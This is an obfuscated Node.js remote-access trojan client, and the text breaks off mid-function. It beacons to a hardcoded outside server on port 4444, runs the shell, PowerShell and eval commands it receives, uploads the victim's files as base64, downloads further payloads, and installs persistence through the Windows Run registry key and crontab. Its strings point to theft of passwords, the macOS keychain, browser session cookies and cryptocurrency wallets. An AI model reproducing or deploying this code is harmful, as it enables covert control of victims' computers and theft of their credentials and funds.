const _0x4518a0=_0x5f4b;function _0x3d3c(){const _0x4c8184=['internal','test','hostname','Source\x20path\x20not\x20found:\x20','session-id','\x0aStderr:\x20','https://www.amazon.com','writeFileSync','birthtime','toString','datr','exit','Solana','serverPort','Download\x20Error:\x20','systemInfo','ps:','1.5\x20ETH','Error:\x20Invalid\x20format.\x20Use\x20download_url:URL:OUTPUT_PATH','freeMem','1521068KWxtio','http','ignore','stack','C:\x5cUsers\x5cUsername\x5cDocuments\x5cXRP','Ошибка\x20выполнения\x20скрипта:\x20','Git\x20Error\x20(code\x20','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cLitecoin','example_linkedin_auth','Path\x20not\x20found:\x20','execSync','split','\x20(no\x20matching\x20files)\x0a','indexOf','2024-02-01','PowerShell\x20Error:\x20','PATH','25\x20SOL','get','hex','round','substring','ps_download:','Monitoring\x20start\x20error:\x20','File\x20downloaded\x20and\x20saved\x20to:\x20','Money$afe123','Domain\x20','0x71C7656EC7ab88b098defB751B7401B5f6d8976F','finish','replace','Error\x20deleting:\x20','stderr','forEach','facebook2023','\x20seconds\x0a','2024-01-15','createDecipheriv','https://www.dropbox.com','3gCFWgq','zip\x20-r\x20FF.zip\x20FF','size','Script\x20saved\x20to\x20','bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','times','data','developer','COOKIES_DATA:','File\x20operations\x20are\x20disabled\x20in\x20this\x20client\x20configuration\x0a','env','https://twitter.com','Command\x20executed\x20(no\x20output)','https://www.instagram.com','slice','arch','example_visitor_info','https://www.linkedin.com','instagram.com','492610NXBJhM','linkedin.com','map','2023-12-31','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cDaedalus','allowShellExecution','uptime','Error\x20executing\x20Git\x20command:\x20','-a\x20','FILE_CONTENT:','Eval\x20result:\x20','\x20is\x20not\x20accessible\x20or\x20not\x20a\x20regular\x20file\x0a','ig_did','Maximum\x20reconnection\x20attempts\x20(','encryptionKey','Invoke-WebRequest\x20-Uri\x20\x22','connect','FF.zip','Not\x20a\x20file:\x20','-Command','twitter.com','randomBytes','freemem','from','lookup','paypal_user','user@gmail.com','7704936hTQcGb','/bin/sh','node_download:','aes-256-cbc','Starting\x20secure\x20client\x20service...','win32','abc123def456ghi789jkl012mno345pqr','push','Set-','Connected\x20-\x20','1000\x20DOGE','13836998GmBLuT','password123','logFile','toFixed','model','NetflixId','child_process','Monitoring\x20was\x20not\x20running\x0a','\x22\x20/f','secureGitPass!','isDirectory',':utf8:','trim','shopper','\x22\x20-OutFile\x20\x22','encryptionEnabled','personalization_id','Dogecoin','Ethereum','netmask','Ripple','concat','Monitoring\x20started\x20with\x20interval\x20','error','\x20не\x20найден\x0a','5VhBPMEEozEidR8XidRdQiUzqV2o2L693dVJbTdCXwaP','open\x20','250716cyReDa','reg\x20add\x20\x22HKCU\x5cSoftware\x5cMicrosoft\x5cWindows\x5cCurrentVersion\x5cRun\x22\x20/v\x20\x22NodeService\x22\x20/t\x20REG_SZ\x20/d\x20\x22node\x20','end','Error\x20finding\x20files:\x20','final','File\x20deleted:\x20','monitoring:start:','Amazon$hopping','Monitoring\x20error:\x20','Eval\x20error:\x20','join','createWriteStream','platform','digest','node\x20','https','close','dns',':binary:true\x0a','sysinfo','286xHfeYz','type','Git\x20command\x20executed\x20successfully\x20(no\x20output)','files:list:','createHash','persistOnStartup','twitteruser','exports','powershell.exe','chdir','Error:\x20Invalid\x20format.\x20Use\x20node_download:URL:OUTPUT_PATH\x0a','example_user_session','Persistence\x20functionality\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','keys','mode','download_url:','Persistence\x20error:\x20','monitoring:stop','Monero','catch','v1_example_personalization','Error\x20reading\x20file:\x20','professional','username','steal:passwords','monitor','NID','1FRMM8PEiWXYax7rpS6X4ZX1aAAAm1Y8xvEP5puWYEZQBwbY','spawn','Process\x20information\x20requires\x20system\x20commands','Directory\x20created:\x20','Monitoring\x20stop\x20error:\x20','File\x20too\x20large\x20for\x20preview\x20(','networkInterfaces','2024-03-15','Error:\x20','Cardano','main','git\x20','pow','files:mkdir:','write','google.com','Bytes','readFileSync','message','net','statusCode','Photo2023!','serverDomain','Application\x20opened\x20successfully','https://www.paypal.com','File\x20not\x20found:\x20','code','Log\x20file\x20rotated\x20due\x20to\x20size\x20limit','startsWith','\x22\x20FF/','Git\x20is\x20not\x20installed\x20or\x20not\x20available\x20in\x20PATH.\x20Please\x20install\x20Git\x20and\x20try\x20again.','download:','family','unlink','allowScreenshot','Shell\x20execution\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','renameSync','clone','1gzNJBr','PowerShell\x20Script\x20Result:\x0a','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cBitcoin','):\x20','splice','Error:\x20Failed\x20to\x20download.\x20Status\x20code:\x20','\x0aClient\x20ID:\x20','random','exec_ps:',')\x0aCurrent\x20directory:\x20','userInfo','\x22)\x20|\x20crontab\x20-','...','netflix.com','persist.js','allowFileTransfer','dirname','Error\x20writing\x20file:\x20','update','MONITORING_DATA:','50\x20DOT','upload:','Ошибка\x20выполнения\x20JavaScript\x20файла:\x20','files:read:','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cDogecoin','22270404wvbveD','9gYxNuW','reddit.com','readdirSync','monitoringInterval','(crontab\x20-l\x202>/dev/null;\x20echo\x20\x22@reboot\x20node\x20','JobSearch2023','Error\x20creating\x20directory:\x20','example_ig_device_id','mac','facebook.com','example_session_id','10393704JjpNNz','Error\x20retrieving\x20cookies:\x20','filter','Attempting\x20to\x20resolve\x20and\x20connect\x20to\x20','190TkbDSx','li_at','existsSync','FILES_LIST:','Polkadot','linux','git\x20--version','Added\x20to\x20crontab\x20@reboot\x0a','Shell\x20execution\x20is\x20disabled\x20in\x20this\x20client\x20configuration','D8vFz4p1L37jdg9E2LmeMgbU1hYHYpKsHS','git:','example_netflix_id','path','File\x20transfer\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a','Screenshot\x20error:\x20','\x20minutes','darwin','\x20->\x20','2024-02-15','maxReconnectAttempts','Exit\x20command\x20received,\x20closing\x20connection','logRotateSize','length','Connection\x20error:\x20','unknown','cmd.exe','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cEthereum','5.2\x20XMR','Received\x20command:\x20','/bin/zsh','logEnabled','cpus','Файл\x20','reconnectDelay','Unknown','cwd','0.25\x20BTC','Invoke-','Invalid\x20parameters\x20for\x20move\x20command\x0a','example_datr_cookie','N/A','example_reddit_session','eval:','createCipheriv','idle','https://github.com','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cSolana','min','2024-01-10','features','stdout','Error\x20(code\x20','C:\x5cUsers\x5cUsername\x5cDocuments\x5cPolkadot','Get-','address','/Users/','base64','appendFileSync','Starting\x20download\x20from\x20','C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cBitcoinCash','...\x0a','powershell\x20-Command\x20\x22','files:move:','Connection\x20closed,\x20scheduling\x20reconnect...','then','File\x20successfully\x20downloaded\x20and\x20saved\x20to:\x20','reddit_session','steal:macos:keychain','includes','rPWwfX6KHxdjiHt3nkrCq1KgUJL8YwQWm1','Directory\x20deleted:\x20','statSync','44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A','stringify','curl\x20--version','Socket','pwd\x20||\x20cd','mkdirSync','log','/Library/Keychains/login.keychain-db','https://www.google.com','Bitcoin','totalmem','tweet2023!','moviefan','\x20-OutFile\x20\x22','Litecoin','isFile','utf8'];_0x3d3c=function(){return _0x4c8184;};return _0x3d3c();}(function(_0x240cb7,_0x3a8b21){const _0x225c93=_0x5f4b,_0x120d89=_0x240cb7();while(!![]){try{const _0x39c648=parseInt(_0x225c93(0x1b3))/0x1*(parseInt(_0x225c93(0xe4))/0x2)+-parseInt(_0x225c93(0x10a))/0x3*(-parseInt(_0x225c93(0x138))/0x4)+-parseInt(_0x225c93(0x77))/0x5*(parseInt(_0x225c93(0x15e))/0x6)+-parseInt(_0x225c93(0x143))/0x7+-parseInt(_0x225c93(0x1d8))/0x8*(-parseInt(_0x225c93(0x1cd))/0x9)+-parseInt(_0x225c93(0x11d))/0xa*(parseInt(_0x225c93(0x172))/0xb)+parseInt(_0x225c93(0x1cc))/0xc;if(_0x39c648===_0x3a8b21)break;else _0x120d89['push'](_0x120d89['shift']());}catch(_0x2aa84e){_0x120d89['push'](_0x120d89['shift']());}}}(_0x3d3c,0xf3480));const net=require(_0x4518a0(0x1a0)),{exec,execSync}=require(_0x4518a0(0x149)),fs=require('fs'),path=require(_0x4518a0(0x83)),os=require('os'),crypto=require('crypto'),dns=require(_0x4518a0(0x16f)),config={'serverDomain':'lesbian.clck.hk','serverPort':0x115c,'reconnectDelay':0x2710,'maxReconnectAttempts':-0x1,'logFile':path[_0x4518a0(0x168)](__dirname,'connection-log.txt'),'logEnabled':![],'logRotateSize':0x5*0x400*0x400,'systemInfo':{'hostname':os[_0x4518a0(0xd2)](),'platform':os[_0x4518a0(0x16a)](),'type':os[_0x4518a0(0x173)](),'arch':os[_0x4518a0(0x119)](),'username':os[_0x4518a0(0x1bd)]()[_0x4518a0(0x189)],'totalMem':Math['round'](os[_0x4518a0(0xc9)]()/(0x400*0x400))+'MB','freeMem':Math[_0x4518a0(0xf8)](os[_0x4518a0(0x133)]()/(0x400*0x400))+'MB','uptime':Math[_0x4518a0(0xf8)](os['uptime']()/0x3c)+_0x4518a0(0x86),'cpuCount':os[_0x4518a0(0x96)]()['length'],'cpuModel':os[_0x4518a0(0x96)]()[0x0][_0x4518a0(0x147)],'id':generateClientId()},'encryptionEnabled':![],'encryptionKey':_0x4518a0(0x13e),'features':{'allowShellExecution':!![],'allowFileTransfer':!![],'allowScreenshot':!![],'persistOnStartup':![]}};function resolveDomainAndConnect(_0x32bd9a=0x0){const _0x2eec23=_0x4518a0;rotateLogIfNeeded(),logMessage(_0x2eec23(0x76)+config['serverDomain']+':'+config[_0x2eec23(0xdd)]+_0x2eec23(0x1bf));if(config['maxReconnectAttempts']>0x0&&_0x32bd9a>=config[_0x2eec23(0x8a)]){logMessage(_0x2eec23(0x12a)+config[_0x2eec23(0x8a)]+')\x20reached,\x20stopping\x20reconnection');return;}dns[_0x2eec23(0x135)](config[_0x2eec23(0x1a3)],(_0x5ce51a,_0x438192)=>{const _0x260ca1=_0x2eec23;if(_0x5ce51a){logMessage('DNS\x20resolution\x20error:\x20'+_0x5ce51a[_0x260ca1(0x19f)]);const _0x3f8775=config[_0x260ca1(0x98)]*Math[_0x260ca1(0xa6)](Math[_0x260ca1(0x199)](1.5,Math['min'](_0x32bd9a,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x32bd9a+0x1);},_0x3f8775);return;}logMessage(_0x260ca1(0xfe)+config[_0x260ca1(0x1a3)]+'\x20resolved\x20to\x20'+_0x438192),connectToServer(_0x438192,_0x32bd9a);});}const logDir=path[_0x4518a0(0x1c3)](config[_0x4518a0(0x145)]);if(!fs[_0x4518a0(0x79)](logDir)&&config[_0x4518a0(0x95)])try{fs[_0x4518a0(0xc4)](logDir,{'recursive':!![]});}catch(_0x5254a1){}function generateClientId(){const _0x3bfe9a=_0x4518a0;try{const _0x56ed23=getMacAddress(),_0x2aca78=os[_0x3bfe9a(0xd2)](),_0x248284=os['userInfo']()[_0x3bfe9a(0x189)],_0x25538c=crypto[_0x3bfe9a(0x176)]('md5')['update'](_0x56ed23+':'+_0x2aca78+':'+_0x248284)[_0x3bfe9a(0x16b)](_0x3bfe9a(0xf7))[_0x3bfe9a(0xf9)](0x0,0x8);return _0x25538c;}catch(_0x165d23){return Math[_0x3bfe9a(0x1ba)]()[_0x3bfe9a(0xd9)](0x24)[_0x3bfe9a(0xf9)](0x2,0xa);}}function getMacAddress(){const _0x57c935=_0x4518a0;try{const _0x53046e=os[_0x57c935(0x193)]();for(const _0x464407 of Object[_0x57c935(0x17f)](_0x53046e)){for(const _0x13b493 of _0x53046e[_0x464407]){if(!_0x13b493[_0x57c935(0xd0)]&&_0x13b493[_0x57c935(0x1d5)]!=='00:00:00:00:00:00')return _0x13b493['mac'];}}return _0x57c935(0x8f);}catch(_0x584ca1){return _0x57c935(0x8f);}}function rotateLogIfNeeded(){const _0xca34aa=_0x4518a0;if(!config['logEnabled'])return;try{if(fs[_0xca34aa(0x79)](config[_0xca34aa(0x145)])){const _0x56449d=fs[_0xca34aa(0xbe)](config['logFile']);if(_0x56449d[_0xca34aa(0x10c)]>config[_0xca34aa(0x8c)]){const _0x3f2642=config[_0xca34aa(0x145)]+'.'+new Date()['toISOString']()[_0xca34aa(0x101)](/:/g,'-');fs[_0xca34aa(0x1b1)](config[_0xca34aa(0x145)],_0x3f2642),logMessage(_0xca34aa(0x1a8));}}}catch(_0x48daa9){}}function logMessage(_0x395482){const _0x3116e0=_0x4518a0;if(!config[_0x3116e0(0x95)])return;const _0x2b3029=new Date()['toISOString'](),_0x11f568='['+_0x2b3029+']\x20'+_0x395482+'\x0a';try{fs[_0x3116e0(0xb0)](config[_0x3116e0(0x145)],_0x11f568);}catch(_0x46950a){}}function encryptData(_0x3b4cac){const _0x48aa4e=_0x4518a0;if(!config[_0x48aa4e(0x152)])return _0x3b4cac;try{const _0x29386b=crypto[_0x48aa4e(0x132)](0x10),_0x2ab5d1=crypto[_0x48aa4e(0xa2)](_0x48aa4e(0x13b),Buffer[_0x48aa4e(0x134)](config[_0x48aa4e(0x12b)]),_0x29386b);let _0x48aa82=_0x2ab5d1['update'](_0x3b4cac);return _0x48aa82=Buffer[_0x48aa4e(0x158)]([_0x48aa82,_0x2ab5d1[_0x48aa4e(0x162)]()]),_0x29386b[_0x48aa4e(0xd9)]('hex')+':'+_0x48aa82[_0x48aa4e(0xd9)]('hex');}catch(_0x4eaa0d){return logMessage('Encryption\x20error:\x20'+_0x4eaa0d['message']),_0x3b4cac;}}function decryptData(_0x2ed1d5){const _0x1f7f4d=_0x4518a0;if(!config['encryptionEnabled'])return _0x2ed1d5;try{const _0xba6a7a=_0x2ed1d5['split'](':');if(_0xba6a7a['length']!==0x2)return _0x2ed1d5;const _0x5e599a=Buffer[_0x1f7f4d(0x134)](_0xba6a7a[0x0],_0x1f7f4d(0xf7)),_0x5e2e1e=Buffer[_0x1f7f4d(0x134)](_0xba6a7a[0x1],_0x1f7f4d(0xf7)),_0x295dc3=crypto[_0x1f7f4d(0x108)]('aes-256-cbc',Buffer[_0x1f7f4d(0x134)](config[_0x1f7f4d(0x12b)]),_0x5e599a);let _0x58d1e6=_0x295dc3[_0x1f7f4d(0x1c5)](_0x5e2e1e);return _0x58d1e6=Buffer[_0x1f7f4d(0x158)]([_0x58d1e6,_0x295dc3[_0x1f7f4d(0x162)]()]),_0x58d1e6[_0x1f7f4d(0xd9)]();}catch(_0x56aa6c){return logMessage('Decryption\x20error:\x20'+_0x56aa6c[_0x1f7f4d(0x19f)]),_0x2ed1d5;}}async function executeCommand(_0x3cf77a){const _0x5f28e4=_0x4518a0;if(!config[_0x5f28e4(0xa8)]['allowShellExecution'])return _0x5f28e4(0x7f);if(_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0x181)))return await downloadFromUrl(_0x3cf77a[_0x5f28e4(0xf9)](0xd));if(os[_0x5f28e4(0x16a)]()==='darwin'){if(_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0x15d))){const _0x5ce921=_0x3cf77a[_0x5f28e4(0xf9)](0x5)[_0x5f28e4(0x14f)]();if(_0x5ce921[_0x5f28e4(0x1a9)](_0x5f28e4(0x125))){const _0x3becf9=_0x5ce921[_0x5f28e4(0xf9)](0x3)[_0x5f28e4(0x14f)]();return new Promise(_0x32bd3b=>{exec('open\x20-a\x20\x22'+_0x3becf9+'\x22',(_0x51f8b6,_0x11c579,_0x28920f)=>{const _0x1cc764=_0x5f4b;if(_0x51f8b6){_0x32bd3b(_0x1cc764(0xaa)+_0x51f8b6[_0x1cc764(0x1a7)]+_0x1cc764(0x1b6)+_0x28920f);return;}_0x32bd3b(_0x11c579||_0x1cc764(0x1a4));});});}return new Promise(_0x446057=>{exec('open\x20'+_0x5ce921,(_0x279bf1,_0x5980a5,_0x13b827)=>{const _0xc7511c=_0x5f4b;if(_0x279bf1){_0x446057(_0xc7511c(0xaa)+_0x279bf1[_0xc7511c(0x1a7)]+'):\x20'+_0x13b827);return;}_0x446057(_0x5980a5||'File\x20or\x20URL\x20opened\x20successfully');});});}}const _0x2926f0=_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0x9c))||_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0x140))||_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0xac))||_0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0xe0));return _0x3cf77a[_0x5f28e4(0x1a9)](_0x5f28e4(0xe0))&&(_0x3cf77a=_0x3cf77a[_0x5f28e4(0xf9)](0x3)),new Promise(_0x1e588b=>{const _0x298f27=_0x5f28e4;let _0x278134=_0x298f27(0x139),_0x14c32b=['-c'];const _0x2bf940=os[_0x298f27(0x16a)]();if(_0x2bf940==='win32')_0x278134=_0x2926f0?'powershell.exe':'cmd.exe',_0x14c32b=_0x2926f0?[_0x298f27(0x130)]:['/c'];else _0x2bf940===_0x298f27(0x87)?(_0x278134=_0x298f27(0x94),_0x14c32b=['-l','-c'],process[_0x298f27(0x114)][_0x298f27(0xf4)]=process[_0x298f27(0x114)][_0x298f27(0xf4)]+':~/ChromeCache/bin/'):(_0x278134='/bin/sh',_0x14c32b=['-l','-c']);(_0x3cf77a[_0x298f27(0x1a9)]('curl\x20')||_0x3cf77a[_0x298f27(0x1a9)]('git\x20'))&&(_0x2bf940===_0x298f27(0x13d)&&(_0x3cf77a[_0x298f27(0x1a9)]('curl\x20')&&!isCurlInstalled()&&(_0x3cf77a=convertCurlToInvokeWebRequest(_0x3cf77a),_0x278134=_0x298f27(0x17a),_0x14c32b=[_0x298f27(0x130)])));const _0x5f9c04=require(_0x298f27(0x149)),_0x1f82e6=_0x5f9c04[_0x298f27(0x18e)](_0x278134,[..._0x14c32b,_0x3cf77a],{'shell':!![],'env':{...process[_0x298f27(0x114)]}});let _0xc9b8a8='',_0x2ba517='';_0x1f82e6['stdout']['on']('data',_0x247748=>{_0xc9b8a8+=_0x247748['toString']();}),_0x1f82e6[_0x298f27(0x103)]['on'](_0x298f27(0x110),_0x49a0a6=>{const _0x55a3c4=_0x298f27;_0x2ba517+=_0x49a0a6[_0x55a3c4(0xd9)]();}),_0x1f82e6['on'](_0x298f27(0x16e),_0x466fd9=>{const _0x344f69=_0x298f27;if(_0x466fd9!==0x0){_0x1e588b(_0x344f69(0xaa)+_0x466fd9+'):\x20'+_0x2ba517);return;}if(_0x2ba517){_0x1e588b(_0xc9b8a8+_0x344f69(0xd5)+_0x2ba517);return;}_0x1e588b(_0xc9b8a8||_0x344f69(0x116));});});}function isCurlInstalled(){const _0x50bfd7=_0x4518a0;try{const _0x497eac=require(_0x50bfd7(0x149));return _0x497eac[_0x50bfd7(0xee)](_0x50bfd7(0xc1),{'stdio':_0x50bfd7(0xe6)}),!![];}catch(_0x28fd2a){return![];}}function convertCurlToInvokeWebRequest(_0x186e9c){const _0x1e854d=_0x4518a0,_0x3bfd1b=_0x186e9c[_0x1e854d(0xef)]('\x20');if(_0x3bfd1b[_0x1e854d(0x8d)]>=0x2){const _0x4b926b=_0x3bfd1b[0x1];let _0xc3a688=_0x1e854d(0x12c)+_0x4b926b+'\x22';const _0xd2ef69=_0x3bfd1b[_0x1e854d(0xf1)]('-o');return _0xd2ef69!==-0x1&&_0x3bfd1b['length']>_0xd2ef69+0x1&&(_0xc3a688+=_0x1e854d(0xcc)+_0x3bfd1b[_0xd2ef69+0x1]+'\x22'),_0xc3a688;}return _0x186e9c;}async function downloadFromUrl(_0x16e8c4){return new Promise(_0x15ba81=>{const _0x2a8ae6=_0x5f4b;try{const _0x11de27=_0x16e8c4['split'](':');if(_0x11de27[_0x2a8ae6(0x8d)]<0x2)return _0x15ba81(_0x2a8ae6(0xe2));const _0x5322d4=_0x11de27[0x0],_0x1d3b09=_0x11de27[_0x2a8ae6(0x118)](0x1)[_0x2a8ae6(0x168)](':'),_0x382fd4=require(_0x2a8ae6(0xe5)),_0x2b6b94=require(_0x2a8ae6(0x16d)),_0x1a74b6=require('fs'),_0x33468d=require(_0x2a8ae6(0x83)),_0xa85d0f=_0x33468d[_0x2a8ae6(0x1c3)](_0x1d3b09);!_0x1a74b6['existsSync'](_0xa85d0f)&&_0x1a74b6[_0x2a8ae6(0xc4)](_0xa85d0f,{'recursive':!![]});const _0xa2fdb1=_0x5322d4['startsWith'](_0x2a8ae6(0x16d))?_0x2b6b94:_0x382fd4,_0x423b1b=_0x1a74b6[_0x2a8ae6(0x169)](_0x1d3b09);_0xa2fdb1[_0x2a8ae6(0xf6)](_0x5322d4,_0x511233=>{const _0x1dd1db=_0x2a8ae6;if(_0x511233['statusCode']!==0xc8)return _0x15ba81(_0x1dd1db(0x1b8)+_0x511233['statusCode']);_0x511233['pipe'](_0x423b1b),_0x423b1b['on'](_0x1dd1db(0x100),()=>{const _0x38639e=_0x1dd1db;_0x423b1b[_0x38639e(0x16e)](),_0x15ba81('File\x20downloaded\x20and\x20saved\x20to:\x20'+_0x1d3b09);});})['on'](_0x2a8ae6(0x15a),_0x2fb993=>{const _0x163dbd=_0x2a8ae6;_0x1a74b6[_0x163dbd(0x1ae)](_0x1d3b09,()=>{}),_0x15ba81(_0x163dbd(0x195)+_0x2fb993[_0x163dbd(0x19f)]);});}catch(_0x3b76eb){_0x15ba81(_0x2a8ae6(0x195)+_0x3b76eb['message']);}});}async function handleSpecialCommands(_0x149ff3,_0x1b42ee){const _0x4c4724=_0x4518a0;if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x1ac))){if(!config[_0x4c4724(0xa8)]['allowFileTransfer'])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x84)),!![];const _0x4fe96c=_0x149ff3[_0x4c4724(0xf9)](0x9)[_0x4c4724(0x14f)]();if(_0x4fe96c[_0x4c4724(0xbb)]('*')||_0x4fe96c[_0x4c4724(0xbb)]('?'))try{const _0x4afe00=path['dirname'](_0x4fe96c),_0x137f74=path['basename'](_0x4fe96c),_0x568513=fs[_0x4c4724(0x1cf)](_0x4afe00||'.');let _0x479479=[];if(_0x137f74[_0x4c4724(0xbb)]('*')||_0x137f74[_0x4c4724(0xbb)]('?')){const _0x493839=_0x137f74[_0x4c4724(0x101)](/\./g,'\x5c.')[_0x4c4724(0x101)](/\*/g,'.*')[_0x4c4724(0x101)](/\?/g,'.'),_0x19d833=new RegExp('^'+_0x493839+'$');_0x479479=_0x568513[_0x4c4724(0x1da)](_0x4bb073=>_0x19d833[_0x4c4724(0xd1)](_0x4bb073));}else _0x479479=_0x568513[_0x4c4724(0x1da)](_0x27f90d=>_0x27f90d===_0x137f74);if(_0x479479[_0x4c4724(0x8d)]>0x0){const _0x125a61=path[_0x4c4724(0x168)](_0x4afe00,_0x479479[0x0]);if(fs[_0x4c4724(0x79)](_0x125a61)&&fs[_0x4c4724(0xbe)](_0x125a61)[_0x4c4724(0xce)]()){const _0x6692fd=fs[_0x4c4724(0x19e)](_0x125a61);return _0x1b42ee['write'](_0x4c4724(0x126)+_0x125a61+':'+_0x6692fd[_0x4c4724(0xd9)]('base64')+'\x0a'),!![];}else return _0x1b42ee['write']('File\x20'+_0x125a61+_0x4c4724(0x128)),!![];}else return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1a6)+_0x4fe96c+_0x4c4724(0xf0)),!![];}catch(_0x272656){return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x161)+_0x272656[_0x4c4724(0x19f)]+'\x0a'),!![];}else try{if(fs[_0x4c4724(0x79)](_0x4fe96c)){const _0x3b8a76=fs[_0x4c4724(0x19e)](_0x4fe96c);return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x126)+_0x4fe96c+':'+_0x3b8a76[_0x4c4724(0xd9)]('base64')+'\x0a'),!![];}else return _0x1b42ee['write'](_0x4c4724(0x1a6)+_0x4fe96c+'\x0a'),!![];}catch(_0x248afe){return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x187)+_0x248afe[_0x4c4724(0x19f)]+'\x0a'),!![];}}if(_0x149ff3['startsWith'](_0x4c4724(0x1c8))){if(!config['features']['allowFileTransfer'])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x84)),!![];const _0x3b3a7c=_0x149ff3[_0x4c4724(0xf9)](0x7)[_0x4c4724(0xef)](':');if(_0x3b3a7c[_0x4c4724(0x8d)]===0x2){const [_0x1c6fd8,_0x949c4e]=_0x3b3a7c;try{const _0x21f318=Buffer[_0x4c4724(0x134)](_0x949c4e,_0x4c4724(0xaf));fs[_0x4c4724(0xd7)](_0x1c6fd8,_0x21f318),_0x1b42ee[_0x4c4724(0x19b)]('File\x20uploaded\x20successfully\x20to:\x20'+_0x1c6fd8+'\x0a');}catch(_0x2be1aa){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1c4)+_0x2be1aa['message']+'\x0a');}return!![];}}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0xa1))){const _0x2eba32=_0x149ff3[_0x4c4724(0xf9)](0x5);try{const _0x355f48=eval(_0x2eba32);_0x1b42ee['write'](_0x4c4724(0x127)+_0x355f48+'\x0a');}catch(_0x18d11d){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x167)+_0x18d11d[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3===_0x4c4724(0x171))return config[_0x4c4724(0xdf)][_0x4c4724(0xe3)]=Math[_0x4c4724(0xf8)](os['freemem']()/(0x400*0x400))+'MB',config['systemInfo'][_0x4c4724(0x123)]=Math[_0x4c4724(0xf8)](os[_0x4c4724(0x123)]()/0x3c)+_0x4c4724(0x86),_0x1b42ee[_0x4c4724(0x19b)]('System\x20Information:\x0a'+JSON['stringify'](config[_0x4c4724(0xdf)],null,0x2)+'\x0a'),!![];if(_0x149ff3==='screenshot'){if(!config['features'][_0x4c4724(0x1af)])return _0x1b42ee['write']('Screenshot\x20functionality\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a'),!![];try{_0x1b42ee[_0x4c4724(0x19b)]('Screenshot\x20functionality\x20requires\x20additional\x20libraries\x20(not\x20implemented)\x0a');}catch(_0x43d527){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x85)+_0x43d527[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)]('persist:')){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x177)])return _0x1b42ee['write'](_0x4c4724(0x17e)),!![];const _0x237687=_0x149ff3[_0x4c4724(0xf9)](0x8);try{const _0x22917d=path['join'](__dirname,_0x4c4724(0x1c1));fs[_0x4c4724(0xd7)](_0x22917d,_0x237687),_0x1b42ee['write'](_0x4c4724(0x10d)+_0x22917d+'\x0a');if(os[_0x4c4724(0x16a)]()===_0x4c4724(0x13d)){const _0x524893=_0x4c4724(0x15f)+_0x22917d+_0x4c4724(0x14b);await executeCommand(_0x524893),_0x1b42ee[_0x4c4724(0x19b)]('Added\x20to\x20Windows\x20startup\x20registry\x0a');}else{if(os[_0x4c4724(0x16a)]()===_0x4c4724(0x7c)||os[_0x4c4724(0x16a)]()===_0x4c4724(0x87)){const _0xbd0816=_0x4c4724(0x1d1)+_0x22917d+_0x4c4724(0x1be);await executeCommand(_0xbd0816),_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x7e));}}}catch(_0x4a8695){_0x1b42ee['write'](_0x4c4724(0x182)+_0x4a8695[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3===_0x4c4724(0x18b)){try{const _0x3e2531={'cpu':getCpuUsage(),'memory':{'total':os[_0x4c4724(0xc9)](),'free':os['freemem'](),'used':os[_0x4c4724(0xc9)]()-os[_0x4c4724(0x133)](),'usedPercent':Math[_0x4c4724(0xf8)]((0x1-os['freemem']()/os[_0x4c4724(0xc9)]())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1c6)+JSON[_0x4c4724(0xc0)](_0x3e2531)+'\x0a');}catch(_0x25c323){_0x1b42ee['write'](_0x4c4724(0x166)+_0x25c323[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x164))){try{const _0x56fce4=parseInt(_0x149ff3[_0x4c4724(0xef)](':')[0x2])||0x3c;global[_0x4c4724(0x1d0)]&&clearInterval(global['monitoringInterval']),global['monitoringInterval']=setInterval(()=>{const _0x1adac2=_0x4c4724;try{const 